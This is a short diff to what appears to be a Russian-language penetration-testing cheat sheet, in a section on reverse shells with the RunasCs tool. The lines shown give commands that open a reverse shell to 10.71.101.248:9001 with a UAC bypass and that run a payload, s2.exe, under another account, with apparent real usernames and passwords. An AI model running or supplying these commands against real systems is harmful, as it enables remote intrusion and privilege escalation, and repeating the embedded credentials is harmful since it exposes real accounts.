@@ -262,7 +262,9 @@ https://github.com/antonioCoco/RunasCs
 
         Реверс на RunAsCs
 
- ./RunasCs.exe 071BondarenkoMA Silvercore_21 cmd.exe -r 10.71.101.248:9001 --bypass-uac --logon-type 8
+ ./RunasCs.exe 071BondarenkoMA password cmd.exe -r 10.71.101.248:9001 --bypass-uac --logon-type 8
+
+.\RunasCs.exe --bypass-uac -l 5 wao WebAO1337 "C:\Users\WAO\Desktop\s2.exe"
 
     ./RunasCs.exe x x tasklist -l 9
 
